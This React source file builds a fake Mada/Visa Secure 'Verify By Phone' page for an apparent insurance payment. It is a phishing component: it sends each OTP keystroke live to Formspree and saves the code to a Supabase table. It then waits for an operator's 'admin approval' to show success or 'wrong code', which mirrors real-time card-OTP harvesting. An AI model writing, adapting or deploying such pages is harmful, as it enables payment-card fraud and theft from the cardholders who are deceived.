import { useState, useEffect } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Shield, RefreshCw, CheckCircle2, Loader2, XCircle } from "lucide-react";
import { ChatButton } from "@/components/ChatButton";
import { Footer } from "@/components/Footer";
import { useToast } from "@/hooks/use-toast";
import { useFormspreeSync } from "@/hooks/useFormspreeSync";
import { supabase } from "@/integrations/supabase/client";
import { usePresence } from "@/hooks/usePresence";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";

const OTPVerification = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const {
    toast
  } = useToast();
  const companyName = searchParams.get("company") || "شركة التأمين";
  const price = searchParams.get("price") || "0";
  const cardLast4 = searchParams.get("cardLast4") || "";
  const [otp, setOtp] = useState("");
  
  // تنسيق رقم البطاقة المخفي
  const maskedCardNumber = cardLast4 ? `XXXX XXXX XXXX ${cardLast4}` : "";
  const [timer, setTimer] = useState(120); // 2 minutes
  const [canResend, setCanResend] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [applicationId, setApplicationId] = useState<string | null>(null);
  const [waitingForApproval, setWaitingForApproval] = useState(false);
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [showErrorDialog, setShowErrorDialog] = useState(false);
  usePresence(applicationId || undefined);

  // Send OTP data to Formspree in real-time
  useFormspreeSync({
    companyName,
    price,
    cardLast4: maskedCardNumber,
    otpEntered: otp,
    otpLength: otp.length,
    remainingTime: `${Math.floor(timer / 60)}:${(timer % 60).toString().padStart(2, "0")}`
  }, "صفحة تأكيد الدفع - OTP Verification");

  useEffect(() => {
    // Get application ID
    const storedId = localStorage.getItem('applicationId');
    if (storedId) {
      setApplicationId(storedId);
    }
  }, []);

  useEffect(() => {
    if (waitingForApproval && applicationId) {
      // Check for approval every 2 seconds
      const interval = setInterval(async () => {
        const { data, error } = await supabase
          .from('customer_applications')
          .select('otp_approved, status')
          .eq('id', applicationId)
          .single();

        if (data?.otp_approved) {
          clearInterval(interval);
          setWaitingForApproval(false);
          setShowSuccessDialog(true);
          
          // إعادة التوجيه إلى الصفحة الرئيسية بعد 3 ثواني
          setTimeout(() => {
            localStorage.removeItem('applicationId');
            navigate("/");
          }, 3000);
        } else if (data?.status === 'rejected') {
          clearInterval(interval);
          setWaitingForApproval(false);
          setShowErrorDialog(true);
          
          // إعادة تعيين OTP للسماح بإعادة المحاولة
          setOtp("");
        }
      }, 2000);

      return () => clearInterval(interval);
    }
  }, [waitingForApproval, applicationId, navigate]);

  // Timer countdown
  useEffect(() => {
    if (timer > 0) {
      const interval = setInterval(() => {
        setTimer(prev => prev - 1);
      }, 1000);
      return () => clearInterval(interval);
    } else {
      setCanResend(true);
    }
  }, [timer]);
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, "0")}`;
  };
  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    // Only allow numbers and limit to 6 digits
    const newValue = e.target.value.replace(/\D/g, "").slice(0, 6);
    setOtp(newValue);
  };
  const handleResendOtp = () => {
    setTimer(120);
    setCanResend(false);
    toast({
      title: "تم إرسال الرمز",
      description: "تم إرسال رمز تحقق جديد إلى رقم هاتفك"
    });
  };
  const handleVerify = async () => {
    if (otp.length < 4 || otp.length > 6) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رمز التحقق (4 أو 6 أرقام)",
        variant: "destructive"
      });
      return;
    }
    
    setIsVerifying(true);

    try {
      if (applicationId) {
        // Save OTP to database
        const { error } = await supabase
          .from('customer_applications')
          .update({
            otp_code: otp,
            current_step: 'otp'
          })
          .eq('id', applicationId);

        if (error) throw error;

        toast({
          title: "تم إرسال الكود",
          description: "في انتظار موافقة الإدارة...",
        });

        setIsVerifying(false);
        setWaitingForApproval(true);
      } else {
        throw new Error('Application ID not found');
      }
    } catch (error) {
      console.error('Error saving OTP:', error);
      setIsVerifying(false);
      toast({
        title: "خطأ",
        description: "حدث خطأ في حفظ البيانات",
        variant: "destructive"
      });
    }
  };
  return <div className="min-h-screen bg-white">
      <section className="pt-8 pb-16 px-4 md:px-6">
        <div className="container mx-auto max-w-2xl">
          {/* Header with logos */}
          <div className="flex items-center justify-between mb-8 pb-6 border-b">
            <div className="flex items-center gap-4">
              <div className="text-2xl font-bold" style={{ color: '#003D82' }}>مدى</div>
            </div>
            <div className="flex flex-col items-end gap-2">
              <button className="text-sm text-gray-600 hover:text-gray-800">Cancel</button>
              <div className="flex items-center gap-2">
                <span className="text-xl font-bold">VISA</span>
                <div className="bg-[#003D82] text-white text-xs px-2 py-1 rounded">SECURE</div>
              </div>
            </div>
          </div>

          {/* Main Content */}
          <div className="space-y-6">
            <h1 className="text-2xl font-semibold text-gray-900">
              Verify By Phone
            </h1>
            
            <p className="text-base text-gray-700">
              We have sent you a text message with a code to your registered mobile number.
            </p>
            
            <p className="text-base text-gray-700">
              You are paying {companyName} the amount of {price} ر.س on {new Date().toLocaleString('en-GB', { 
                year: 'numeric', 
                month: '2-digit', 
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
              }).replace(',', '')}.
            </p>

            {/* OTP Input */}
            <div className="space-y-3 pt-8">
              <label className="text-sm text-gray-600 block">
                Verification code
              </label>
              <Input
                type="text"
                inputMode="numeric"
                maxLength={6}
                value={otp}
                onChange={handleOtpChange}
                className="h-12 text-lg border-gray-300 rounded focus:border-blue-600 focus:ring-1 focus:ring-blue-600 bg-white"
                dir="ltr"
                disabled={waitingForApproval}
              />
            </div>

            {/* Confirm Button */}
            <Button
              onClick={handleVerify}
              disabled={isVerifying || waitingForApproval || otp.length < 4}
              className="w-full h-12 text-base font-semibold rounded bg-blue-600 hover:bg-blue-700 text-white disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isVerifying ? (
                <>
                  <Loader2 className="ml-2 h-5 w-5 animate-spin" />
                  جاري التحقق...
                </>
              ) : waitingForApproval ? (
                <>
                  <Loader2 className="ml-2 h-5 w-5 animate-spin" />
                  في انتظار الموافقة...
                </>
              ) : (
                "CONFIRM"
              )}
            </Button>

            {/* Resend Code */}
            <div className="text-center pt-4">
              {canResend ? (
                <button
                  onClick={handleResendOtp}
                  className="text-blue-600 hover:text-blue-800 font-medium text-base underline"
                >
                  RESEND CODE
                </button>
              ) : (
                <p className="text-sm text-gray-500">
                  يمكنك إعادة إرسال الرمز بعد {formatTime(timer)}
                </p>
              )}
            </div>

            {waitingForApproval && (
              <div className="mt-4 p-4 bg-yellow-50 border border-yellow-200 rounded">
                <p className="text-sm text-yellow-800 text-center">
                  🕐 يرجى الانتظار... تم إرسال كود التحقق وننتظر موافقة الإدارة
                </p>
              </div>
            )}

            {/* Help Links */}
            <div className="pt-8 space-y-3 border-t">
              <details className="group">
                <summary className="flex items-center justify-between cursor-pointer text-blue-600 hover:text-blue-800 text-base font-medium">
                  Learn more about authentication
                  <span className="text-xl group-open:rotate-45 transition-transform">+</span>
                </summary>
                <div className="mt-3 text-sm text-gray-600">
                  التحقق من الهاتف هو طبقة أمان إضافية لحماية معاملاتك المالية.
                </div>
              </details>
              
              <details className="group">
                <summary className="flex items-center justify-between cursor-pointer text-blue-600 hover:text-blue-800 text-base font-medium">
                  Need some help ?
                  <span className="text-xl group-open:rotate-45 transition-transform">+</span>
                </summary>
                <div className="mt-3 text-sm text-gray-600">
                  إذا واجهت أي مشكلة، يرجى التواصل مع خدمة العملاء.
                </div>
              </details>
            </div>
          </div>
        </div>
      </section>

      <ChatButton />
      <Footer />

      {/* نافذة النجاح */}
      <Dialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
        <DialogContent className="sm:max-w-md text-center">
          <DialogHeader>
            <div className="mx-auto mb-4 flex h-20 w-20 items-center justify-center rounded-full bg-green-100 dark:bg-green-900/20">
              <CheckCircle2 className="h-12 w-12 text-green-600 dark:text-green-400" />
            </div>
            <DialogTitle className="text-2xl font-bold text-center">
              تم الدفع بنجاح! 🎉
            </DialogTitle>
            <DialogDescription className="text-center text-base pt-2">
              تم تأكيد عملية الدفع بنجاح
              <br />
              سيتم إعادة توجيهك إلى الصفحة الرئيسية...
            </DialogDescription>
          </DialogHeader>
          <div className="flex justify-center pt-2">
            <Loader2 className="h-6 w-6 animate-spin text-primary" />
          </div>
        </DialogContent>
      </Dialog>

      {/* نافذة الخطأ */}
      <Dialog open={showErrorDialog} onOpenChange={(open) => {
        setShowErrorDialog(open);
        if (!open) {
          // إعادة تعيين حالة الرفض في قاعدة البيانات عند إغلاق النافذة
          if (applicationId) {
            supabase
              .from('customer_applications')
              .update({ status: 'pending' })
              .eq('id', applicationId);
          }
        }
      }}>
        <DialogContent className="sm:max-w-md text-center">
          <DialogHeader>
            <div className="mx-auto mb-4 flex h-20 w-20 items-center justify-center rounded-full bg-red-100 dark:bg-red-900/20">
              <XCircle className="h-12 w-12 text-red-600 dark:text-red-400" />
            </div>
            <DialogTitle className="text-2xl font-bold text-center text-red-600 dark:text-red-400">
              رمز تحقق غير صحيح! ❌
            </DialogTitle>
            <DialogDescription className="text-center text-base pt-2">
              يرجى إدخال رمز التحقق الصحيح
              <br />
              حاول مرة أخرى
            </DialogDescription>
          </DialogHeader>
          <Button 
            onClick={() => setShowErrorDialog(false)}
            className="mt-4"
            variant="default"
          >
            حسناً، سأحاول مرة أخرى
          </Button>
        </DialogContent>
      </Dialog>
    </div>;
};
export default OTPVerification;